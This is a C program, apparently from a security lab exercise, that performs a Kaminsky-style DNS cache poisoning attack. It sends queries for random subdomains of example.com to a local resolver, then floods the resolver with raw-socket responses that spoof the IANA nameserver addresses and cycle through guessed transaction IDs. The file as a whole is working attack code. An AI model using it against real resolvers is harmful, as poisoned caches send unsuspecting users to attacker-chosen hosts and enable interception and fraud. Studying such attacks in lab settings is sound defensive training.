#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000
#define bIana "199.43.133.53"
#define aIana "199.43.135.53"


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char* buffer, int pkt_size);
void send_dns_request(unsigned char *ip_req, int n_req, char *name);
void send_dns_response(unsigned char *ip_res, int n_res, char *name, char* ip, unsigned short transaction_id);

int main()
{
  unsigned short transaction_id = 0;
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];

    printf("Random name: %s trans_id: %d\n", name, transaction_id);

    //##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */

    send_dns_request(ip_req, n_req, name);

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    
    for(int i = 0; i < 250; i++)
    {
      send_dns_response(ip_resp, n_resp, name, aIana, transaction_id); // send the first response to a.iana-servers.net , the NS server of example.com
      send_dns_response(ip_resp, n_resp, name, bIana, transaction_id); // send the second response to b.iana-servers.net , the NS server of example.com
      transaction_id++;
    }
    
  }
}


/* Use for sending DNS request.
 * @param ip_req: the DNS request packet, read from file.
  * @param n_req: the size of the DNS request packet, read from file.
  * @param name: the domain name to be queried - the reandomly generated name.
 * */
void send_dns_request(unsigned char *ip_req, int n_req, char *name)
{
  // Modify the DNS request with the new name, the offset is 41
  memcpy(ip_req + 41, name, 5);
  //send the DNS request
  send_raw_packet(ip_req, n_req);
}


/* Use for sending forged DNS response.
 * @param ip_res: the DNS response packet, read from file.
 * @param n_res: the size of the DNS response packet, read from file.
 * @param name: the domain name in the DNS response packet  - the reandomly generated name.
 * @param ip: the IP address in the DNS response packet - one of the 2 address of the example.com NS record.
 * @param transaction_id: the transaction ID in the DNS response packet - the gueesed value.
 * */
void send_dns_response(unsigned char *ip_res, int n_res, char *name, char* ip, unsigned short transaction_id)
{
  int src_ip = (int)inet_addr(ip); //change the IP address to integer format
  // Modify the IP header with the new source IP address, the offset is 12
  memcpy(ip_res + 12, (void*)&src_ip, 4); //change the source IP address, use (void*)&src_ip to change the integer to char array, copy byte by byte
  // Modify the DNS response with the new name in the question field, the offset is 41
  memcpy(ip_res + 41, name, 5);
  // Modify the DNS response with the new name in the answer field, the offset is 64
  memcpy(ip_res + 64, name, 5);
  // Modify the DNS response with the new gueesed transaction ID, the offset is 28
  unsigned short id = htons(transaction_id); //change the integer to network byte order
  memcpy(ip_res + 28, (void*)&id, 2); //copy the transaction ID byte by byte, 2 bytes as it is a short
  //send the DNS response
  send_raw_packet(ip_res, n_res);// send the packet
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
